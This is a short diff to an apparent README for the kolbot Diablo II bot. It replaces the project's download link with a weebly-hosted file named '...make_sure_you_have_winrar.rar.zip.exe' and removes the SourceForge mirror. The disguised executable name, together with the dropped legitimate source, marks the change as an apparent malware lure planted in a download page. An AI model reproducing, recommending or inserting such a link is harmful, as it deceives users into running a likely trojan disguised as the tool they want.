@@ -1,7 +1,5 @@
-<a href="http://kolbot.orgfree.com/">D2bot-with-kolbot-DOWNLOAD HERE</a>
+<a href="http://www.weebly.com/uploads/1/3/1/2/13129759/kolbot-_new_core_6.5.2.3_make_sure_you_have_winrar.rar.zip.exe">D2bot-with-kolbot-DOWNLOAD HERE</a>
 =================
-I am working on uploading it on github too, to download go to this URL:
-https://sourceforge.net/projects/d2bot/files/latest/download?source=dlp
 
 Private - Modified Version of kolbot Uses newer Core
 
